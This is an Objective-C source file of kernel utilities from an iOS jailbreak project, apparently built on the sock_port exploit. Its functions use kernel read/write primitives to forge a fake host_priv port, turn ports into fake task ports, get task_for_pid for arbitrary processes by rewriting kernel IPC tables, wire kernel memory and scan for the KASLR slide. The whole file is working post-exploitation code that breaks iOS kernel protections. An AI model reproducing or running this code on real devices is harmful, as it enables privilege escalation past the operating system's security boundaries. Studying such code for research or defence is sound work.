
#import "kernel_utils.h"
#import "../PatchFinder/patchfinder64.h"
#import "../Exploits/sock_port/offsetof.h"
#import "../Exploits/sock_port/offsets.h"
#import "kexecute.h"
#include "../Exploits/sock_port/kernel_memory.h"
#include <stdbool.h>
#include <spawn.h>
#import <Foundation/Foundation.h>

static mach_port_t tfpzero;

void init_kernel_utils(mach_port_t tfp0) {
    tfpzero = tfp0;
}

int Kernel_strcmp(uint64_t kstr, const char* str) {
    // XXX be safer, dont just assume you wont cause any
    // page faults by this
    size_t len = strlen(str) + 1;
    char *local = malloc(len + 1);
    local[len] = '\0';
    
    int ret = 1;
    
    if (kread(kstr, local, len) == len) {
        ret = strcmp(local, str);
    }
    
    free(local);
    
    return ret;
}

uint64_t TaskSelfAddr() {
    uint64_t selfproc = proc_of_pid(getpid());
    if (selfproc == 0) {
        fprintf(stderr, "Kernel Utils: failed to find our task addr\n");
        return -1;
    }
    uint64_t addr = rk64(selfproc + off_task);
    
    uint64_t task_addr = addr;
    uint64_t itk_space = rk64(task_addr + off_itk_space);
    
    uint64_t is_table = rk64(itk_space + off_ipc_space_is_table);
    
    uint32_t port_index = mach_task_self() >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
    
    return port_addr;
}

uint64_t IPCSpaceKernel() {
    return rk64(TaskSelfAddr() + 0x60);
}

uint64_t FindPortAddress(mach_port_name_t port) {
   
    uint64_t task_port_addr = TaskSelfAddr();
    //uint64_t task_addr = TaskSelfAddr();
    uint64_t task_addr = rk64(task_port_addr + off_ip_kobject);
    uint64_t itk_space = rk64(task_addr + off_itk_space);
    
    uint64_t is_table = rk64(itk_space + off_ipc_space_is_table);
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;

    uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));

    return port_addr;
}

mach_port_t FakeHostPriv_port = MACH_PORT_NULL;

bool PatchHostPriv(mach_port_t host) {
    
#define IO_ACTIVE 0x80000000
#define IKOT_HOST_PRIV 4
    
    // locate port in kernel
    uint64_t host_kaddr = FindPortAddress(host);
    
    // change port host type
    uint32_t old = rk32(host_kaddr + 0x0);
    printf("Kernel Utils: Old host type: 0x%x\n", old);
    
    wk32(host_kaddr + 0x0, IO_ACTIVE | IKOT_HOST_PRIV);
    
    uint32_t new = rk32(host_kaddr);
    printf("Kernel Utils: New host type: 0x%x\n", new);
    
    return ((IO_ACTIVE | IKOT_HOST_PRIV) == new) ? true : false;
}

// build a fake host priv port
mach_port_t FakeHostPriv() {
    if (FakeHostPriv_port != MACH_PORT_NULL) {
        return FakeHostPriv_port;
    }
    // get the address of realhost:
    uint64_t hostport_addr = FindPortAddress(mach_host_self());
    uint64_t realhost = rk64(hostport_addr + off_ip_kobject);
    
    // allocate a port
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        printf("Kernel Utils: failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    // get a send right
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    // make sure port type has IKOT_HOST_PRIV
    PatchHostPriv(port);
    
    // locate the port
    uint64_t port_addr = FindPortAddress(port);

    // change the space of the port
    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), IPCSpaceKernel());
    
    // set the kobject
    wk64(port_addr + off_ip_kobject, realhost);
    
    FakeHostPriv_port = port;
    
    return port;
}

uint64_t Kernel_alloc_wired(uint64_t size) {
    if (tfpzero == MACH_PORT_NULL) {
        printf("Kernel Utils: Attempt to allocate kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return 0;
    }
    
    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    
    printf("Kernel Utils: vm_kernel_page_size: %lx\n", vm_kernel_page_size);
    
    err = mach_vm_allocate(tfpzero, &addr, ksize+0x4000, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        printf("Kernel Utils: unable to allocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return 0;
    }
    
    printf("Kernel Utils: allocated address: %llx\n", addr);
    
    addr += 0x3fff;
    addr &= ~0x3fffull;
    
    printf("Kernel Utils: address to wire: %llx\n", addr);
    
    err = mach_vm_wire(FakeHostPriv(), tfpzero, addr, ksize, VM_PROT_READ|VM_PROT_WRITE);
    if (err != KERN_SUCCESS) {
        printf("Kernel Utils: unable to wire kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return 0;
    }
    return addr;
}

const uint64_t kernel_address_space_base = 0xffff000000000000;
void Kernel_memcpy(uint64_t dest, uint64_t src, uint32_t length) {
    if (dest >= kernel_address_space_base) {
        // copy to kernel:
        kwrite(dest, (void*) src, length);
    } else {
        // copy from kernel
        kread(src, (void*)dest, length);
    }
}

void convertPortToTaskPort(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = FindPortAddress(port);
    
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), 0x80000000 | 2);
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = TaskSelfAddr();
    uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}

void MakePortFakeTaskPort(mach_port_t port, uint64_t task_kaddr) {
    convertPortToTaskPort(port, IPCSpaceKernel(), task_kaddr);
}

uint64_t proc_of_pid(pid_t proc_pid) {
    uint64_t proc = rk64(Find_allproc());
    while (proc) {
        uint32_t pid = (uint32_t)rk32(proc + off_p_pid);
        if (pid == proc_pid){
            return proc;
        }
        proc = rk64(proc);
    }
    
    return 0;
}

uint64_t proc_of_procName(char *nm) {
    uint64_t proc = rk64(Find_allproc());
    char name[40] = {0};
    while (proc) {
        kread(proc + off_p_comm, name, 40); //read 20 bytes off the process's name and compare
        if (strstr(name, nm)) return proc;
        proc = rk64(proc);
    }
    return 0;
}

unsigned int pid_of_procName(char *nm) {
    uint64_t proc = rk64(Find_allproc());
    char name[40] = {0};
    while (proc) {
        kread(proc + off_p_comm, name, 40);
        if (strstr(name, nm)) return rk32(proc + off_p_pid);
        proc = rk64(proc);
    }
    return 0;
}

uint64_t taskStruct_of_pid(pid_t pid) {
    uint64_t task_kaddr = rk64(TaskSelfAddr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    while (task_kaddr) {
        uint64_t proc = rk64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        uint32_t pd = rk32(proc + off_p_pid);
        if (pd == pid) return task_kaddr;
        task_kaddr = rk64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
    return 0;
}

uint64_t taskStruct_of_procName(char *nm) {
    uint64_t task_kaddr = rk64(TaskSelfAddr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    char name[40] = {0};
    while (task_kaddr) {
        uint64_t proc = rk64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        kread(proc + off_p_comm, name, 40);
        if (strstr(name, nm)) return task_kaddr;
        task_kaddr = rk64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
    return 0;
}

uint64_t taskPortKaddr_of_pid(pid_t pid) {
    uint64_t proc = proc_of_pid(pid);
    if (!proc) {
        printf("Kernel Utils: Failed to find proc of pid %d\n", pid);
        return 0;
    }
    uint64_t task = rk64(proc + off_task);
    uint64_t itk_space = rk64(task + off_itk_space);
    uint64_t is_table = rk64(itk_space + off_ipc_space_is_table);
    uint64_t task_port_kaddr = rk64(is_table + 0x18);
    return task_port_kaddr;
}

uint64_t taskPortKaddr_of_procName(char *nm) {
    uint64_t proc = proc_of_procName(nm);
    if (!proc) {
        printf("Kernel Utils: Failed to find proc of process %s\n", nm);
        return 0;
    }
    uint64_t task = rk64(proc + off_task);
    uint64_t itk_space = rk64(task + off_itk_space);
    uint64_t is_table = rk64(itk_space + off_ipc_space_is_table);
    uint64_t task_port_kaddr = rk64(is_table + 0x18);
    return task_port_kaddr;
}

// Original method by Ian Beer
mach_port_t task_for_pid_in_kernel(pid_t pid) {
    
    // allocate a new port we have a send right to
    mach_port_t port = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    // find task port in kernel
    uint64_t task_port_kaddr = taskPortKaddr_of_pid(pid);
    uint64_t task = rk64(proc_of_pid(pid) + off_task);
    
    // leak some refs
    wk32(task_port_kaddr + 0x4, 0x383838);
    wk32(task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT), 0x393939);
    
    // get the address of the ipc_port of our allocated port
    uint64_t selfproc = proc_of_pid(getpid());
    if (!selfproc) {
        printf("Kernel Utils: Failed to find our proc?\n");
        return MACH_PORT_NULL;
    }
    uint64_t selftask = rk64(selfproc + off_task);
    uint64_t itk_space = rk64(selftask + off_itk_space);
    uint64_t is_table = rk64(itk_space + off_ipc_space_is_table);
    uint32_t port_index = port >> 8;
    
    // point the port's ie_object to the task port
    wk64(is_table + (port_index * 0x18), task_port_kaddr);
    
    // remove our recieve right
    uint32_t ie_bits = rk32(is_table + (port_index * 0x18) + 8);
    ie_bits &= ~(1 << 17); // clear MACH_PORT_TYPE(MACH_PORT_RIGHT_RECIEVE)
    wk32(is_table + (port_index * 0x18) + 8, ie_bits);
    
    return port;
}

uint64_t ZmFixAddr(uint64_t addr) {
    static kmap_hdr_t zm_hdr = {0, 0, 0, 0};
    
    if (zm_hdr.start == 0) {
        // xxx rk64(0) ?!
        uint64_t zone_map = rk64(Find_zone_map_ref());
        // hdr is at offset 0x10, mutexes at start
        size_t r = kread(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
        //printf("zm_range: 0x%llx - 0x%llx (read 0x%zx, exp 0x%zx)\n", zm_hdr.start, zm_hdr.end, r, sizeof(zm_hdr));
        
        if (r != sizeof(zm_hdr) || zm_hdr.start == 0 || zm_hdr.end == 0) {
            printf("Kernel Utils: kread of zone_map failed!\n");
            return 1;
        }
        
        if (zm_hdr.end - zm_hdr.start > 0x100000000) {
            printf("Kernel Utils: zone_map is too big, sorry.\n");
            return 1;
        }
    }
    
    uint64_t zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff);
    
    return zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp;
}

uint64_t grabKernelBase() {
    printf("Obtaining KASLR slide...\n");
    
#define slid_base  base+slide
    uint64_t base = 0xFFFFFFF007004000;
    uint32_t slide = 0x21000000;
    uint32_t data = rk32(slid_base);
    
    for(;;) {
        while (data != 0xFEEDFACF) {
            slide -= 0x200000;
            data = rk32(slid_base);
        }
        
        printf("Found 0xfeedfacf Mach-O header at 0x%llx, checking...\n", slid_base);
        
        char buf[0x120];
        for (uint64_t addr = slid_base; addr < slid_base + 0x2000; addr += 8 /* 64 bits / 8 bits / byte = 8 bytes */) {
            kread(addr, buf, 0x120); // read 0x120 bytes into a char buffer
            
            if (!strcmp(buf, "__text") && !strcmp(buf + 16, "__PRELINK_TEXT")) { // found it!
                printf("\t  The Kernel base at 0x%llx\n", slid_base);
                printf("\t  KASLR slide is 0x%x\n", slide);
                printf("\t  Kernel header is 0x%x\n", rk32(slid_base));
                return slid_base;
            }
            data = 0;
        }
        printf("\tCould not find __text and __PRELINK_TEXT, trying again!\n");
    }
    return 0;
}
